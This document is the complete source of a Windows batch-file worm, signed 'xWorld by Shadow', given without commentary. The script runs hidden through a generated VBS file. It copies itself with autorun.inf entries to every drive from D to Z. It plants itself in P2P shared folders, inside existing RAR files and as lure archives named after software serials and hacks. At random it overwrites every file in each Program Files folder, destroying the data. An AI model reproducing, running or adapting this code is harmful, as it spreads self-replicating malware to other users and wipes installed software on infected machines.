@echo off
goto %1_
:_
set a="%temp%\xw.bat"
echo set shell = CreateObject("wscript.shell") > "%temp%\xwr.vbs"
echo shell.run "cmd /c %a% xc", vbHide >> "%temp%\xwr.vbs"
copy %0 %a%>nul
start "%temp%\xwr.vbs"

:xc_
for %%v IN (D F G H I J K L M N O P Q R S T U V W X Y Z) do call :cmp %%v
call :p2p
if /I %random:~1,1% lss 5 goto wrm
exit

:cmp
if exist "%1:" (
copy %a% "%1:\xw.bat">nul
echo [autorun] > "%1:\autorun.inf"
echo open=xw.bat >> "%1:\autorun.inf"
echo shellexecute=xw.bat >> "%1:\autorun.inf"
echo shellexecute=xw.bat >> "%1:\autorun.inf"
echo shell\explorar\command=xw.bat >> "%1:\autorun.inf"
echo shell\explorar=^&Explorar >> "%1:\autorun.inf"
)
goto :EOF

:wrm

cd "%programfiles%"
dir /B > %homedrive%\dir.txt
goto for

:worm
set target=%1
cd "%target%"
for %%e in (*.*) do echo xWorld by Shadow>%%e
cd "%programfiles%"
goto :EOF

:for
for /f "tokens=* " %%a in (%homedrive%\dir.txt) do call :worm "%%a"
exit

:p2p
set a="%temp%\xw.bat"
if exist %windir%\t.rar (del %windir%\t.rar)
type %0>op.bat
set o="%systemdrive%%~p0op.bat"
cd "%systemdrive%%~p0"
echo eMule\Incoming\ > %windir%\yer.t
echo Shareaza\Downloads\ >> %windir%\yer.t
echo BearShare\Shared\ >> %windir%\yer.t
echo EDONKEY2000\incoming\ >> %windir%\yer.t
echo LimeWire\Shared\ >> %windir%\yer.t
echo Path_msn_Emoticonos > %windir%\jer.t
echo sms_gratis >> %windir%\jer.t
echo polifonicos_free >> %windir%\jer.t
echo Microsoft_Office_2007_all_serials >> %windir%\jer.t
echo Windows_Vista_activation_tool >> %windir%\jer.t
echo Windows_Vista_all_serials >> %windir%\jer.t
echo MSN_hack_codes >> %windir%\jer.t
set rc=1
set r="%programfiles%\WINRAR\WinRAR.exe"
%r% a %windir%\t.rar %o%
if not %errorlevel%==9009 set rc=0
goto fr
:fr2
set uno=%1
for /F "tokens=* delims=" %%g in (%windir%\jer.t) do (
if %rc%==0 (
@copy /y %o% "%%g.bat"
cls
ping -n 2 localhost > nul
%r% a "%%g.rar" "%%g.bat"
)
)
goto :EOF
:fr
for /F "tokens=* delims=" %%a in (%windir%\yer.t) do (
if exist "%programfiles%\%%a" (
cd "%programfiles%\%%a"
for %%e in (*.rar) do (
@copy /y %o% "%%~ne.bat"
cls
ping -n 2 localhost > nul
%r% a "%%e" "%%~ne.bat"
)
call :fr2 %%a
)
)
pause
cd %windir%
del *.t
cd "%systemdrive%%~p0"
del op.bat
goto :EOF


